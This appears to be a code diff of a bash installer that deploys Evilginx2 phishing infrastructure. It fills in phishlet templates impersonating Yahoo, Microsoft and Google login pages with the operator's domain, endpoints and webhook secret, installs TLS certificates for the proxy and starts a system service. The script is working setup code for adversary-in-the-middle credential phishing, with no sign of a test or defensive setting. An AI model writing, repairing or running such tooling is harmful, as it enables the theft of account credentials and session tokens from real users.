@@ -566,32 +566,44 @@ start_service() {
 # Configure Evilginx2 integration
 # ============================================================================
 configure_evilginx_integration() {
+    # ============================================
+    # Configure Evilginx with correct syntax
+    # ============================================
     log "Configuring Evilginx2 integration..."
 
-    # Copy certificates to Evilginx directory for internal use
-    cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/"
-    cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/"
+    # Create directories
+    sudo mkdir -p /opt/evilginx/{phishlets,certs}
 
-    # Create Evilginx config from template
-    if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
-        sed -e "s/{{.Domain}}/$DOMAIN/g" \
-            -e "s/{{.VpsIp}}/$VPS_IP/g" \
-            "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
-    fi
+    # Create Evilginx config from template (using = not spaces)
+    sed -e "s/{{.Domain}}/$DOMAIN/g" \
+        -e "s/{{.VpsIp}}/$VPS_IP/g" \
+        "$INSTALL_DIR/templates/evilginx.yaml.tmpl" | sudo tee /opt/evilginx/config.yaml > /dev/null
 
-    # Create phishlets from templates with correct names
-    for tmpl in yahoo microsoft google; do
-        if [ -f "$INSTALL_DIR/templates/phishlets/${tmpl}.yaml.tmpl" ]; then
-            sed -e "s/{{.Domain}}/$DOMAIN/g" \
-                -e "s/{{.VpsIp}}/$VPS_IP/g" \
-                -e "s/{{.Endpoint1}}/$EP1/g" \
-                -e "s/{{.Endpoint2}}/$EP2/g" \
-                -e "s/{{.Endpoint3}}/$EP3/g" \
-                -e "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
-                -e "s/{{.AppPort}}/$APP_PORT/g" \
-                "$INSTALL_DIR/templates/phishlets/${tmpl}.yaml.tmpl" > "$EVILGINX_DIR/phishlets/${tmpl}.yaml"
-        fi
+    # Create phishlets from templates
+    local i=1
+    for phishlet in yahoo microsoft google; do
+        ENDPOINT_VAR="Endpoint${i}"
+        if [ "$phishlet" = "yahoo" ]; then i=1; fi
+        if [ "$phishlet" = "microsoft" ]; then i=2; fi
+        if [ "$phishlet" = "google" ]; then i=3; fi
+        
+        EP_VAR="EP$i"
+        EP_VALUE="${!EP_VAR}"
+        
+        sed -e "s/{{.Endpoint${i}}}/$EP_VALUE/g" \
+            -e "s/{{.Domain}}/$DOMAIN/g" \
+            -e "s/{{.AppPort}}/8080/g" \
+            -e "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
+            "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" | sudo tee /opt/evilginx/phishlets/${phishlet}.yaml > /dev/null
     done
+
+    # Copy certificates
+    sudo cp /etc/letsencrypt/live/$DOMAIN/fullchain.pem /opt/evilginx/certs/
+    sudo cp /etc/letsencrypt/live/$DOMAIN/privkey.pem /opt/evilginx/certs/
+
+    # Set permissions
+    sudo chmod 755 /opt/evilginx/phishlets
+    sudo chmod 644 /opt/evilginx/phishlets/*.yaml
 
     # Create Evilginx systemd service
     cat > /etc/systemd/system/evilginx.service << EOF
